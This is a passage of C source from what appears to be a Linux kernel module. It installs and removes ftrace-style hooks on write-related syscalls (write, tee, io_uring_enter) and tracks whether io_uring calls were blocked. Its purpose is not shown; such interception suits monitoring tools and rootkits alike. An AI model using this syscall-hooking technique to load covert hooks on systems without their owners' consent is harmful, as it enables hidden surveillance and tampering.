    HOOK(ARCH_SYS_IA32("tee"),               hooked_tee_ia32,             &original_tee_ia32),
    HOOK(ARCH_SYS_IA32("io_uring_enter"),    hooked_io_uring_enter2,      &original_io_uring_enter2),
};
#endif /* ARCH_SYS_IA32 */

/* ── init / exit ─────────────────────────────────────────────────────── */

int hooks_write_init(void)
{
    int ret, i, installed = 0;

    for (i = 0; i < (int)ARRAY_SIZE(hw_hooks); i++) {
        if (fh_install_hook(&hw_hooks[i]) == 0)
            installed++;
    }

#ifdef ARCH_SYS_IA32
    for (i = 0; i < (int)ARRAY_SIZE(hw_hooks_ia32); i++)
        fh_install_hook(&hw_hooks_ia32[i]);
#endif

    /* Require at least write + io_uring_enter */
    ret = (installed >= 2) ? 0 : -ENOENT;
    return ret;
}

void hooks_write_exit(void)
{
    unsigned long flags;
    int i;

    spin_lock_irqsave(&io_uring_cache_lock, flags);
    io_uring_last_blocked  = 0;
    io_uring_last_jiffies  = 0;
    spin_unlock_irqrestore(&io_uring_cache_lock, flags);

    for (i = (int)ARRAY_SIZE(hw_hooks) - 1; i >= 0; i--) {
        if (hw_hooks[i].address)
            fh_remove_hook(&hw_hooks[i]);
    }

#ifdef ARCH_SYS_IA32
    for (i = (int)ARRAY_SIZE(hw_hooks_ia32) - 1; i >= 0; i--) {
        if (hw_hooks_ia32[i].address)
            fh_remove_hook(&hw_hooks_ia32[i]);
    }
#endif
}
